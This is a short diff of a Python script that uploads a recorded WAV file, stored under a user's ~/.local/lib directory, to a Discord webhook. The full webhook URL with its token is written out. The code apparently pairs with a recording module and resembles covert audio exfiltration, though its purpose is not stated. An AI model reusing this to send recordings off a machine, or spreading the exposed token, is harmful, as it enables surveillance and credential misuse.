@@ -1,3 +1,4 @@
+#This code is below is just for sending message with the audio file 
 '''
 import requests
 import Bro
@@ -14,12 +15,15 @@ response = requests.post(webhook_url, json=data)
 
 
 from dhooks import Webhook, File
-from Bro import OUTPUT_FILENAME
+import Bro
 
 hook = Webhook("https://discord.com/api/webhooks/1461244445058924619/tC4fUIBShpIMPWBEPOdUc6Z6D9ioNAC7mgUBfhLy_dWo70Nn8QlB36g3dv9WdZbprKX_")
 
 
-discord = File("files/Pyaduio/desktop_audio.wav")
+
+discord = File("/home/mrtightlight/.local/lib/Pyaudio/output.wav")
                
 hook.send(file=discord)
+#The break system is for when pip dose not install wright 
+#pip install dhook --break-system-packages
 
